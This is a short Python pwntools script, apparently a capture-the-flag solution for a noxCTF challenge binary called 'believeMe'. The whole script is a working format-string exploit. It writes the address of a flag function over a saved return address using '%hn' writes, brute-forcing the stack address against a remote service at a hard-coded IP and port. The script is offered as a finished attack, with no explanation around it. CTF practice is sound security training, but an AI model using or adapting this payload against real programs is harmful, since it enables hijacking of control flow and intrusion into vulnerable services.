from pwn import *
elf = ELF('./believeMe')
noxFlag = elf.symbols['noxFlag']
for i in range(0,100):
    eip = 0xffffdd10 + i
    payload = ""
    payload += p32(eip) + p32(eip + 2) + "%34419x%9$hn" + "%98697x%10$hn"
    p = remote("18.223.228.52",13337)
    p.sendline(payload)
    data = p.recvall(timeout=6)
    if "noxCTF" in data :
        print data
        break
    else:
        print "trying eip: "+hex(eip)
    p.close()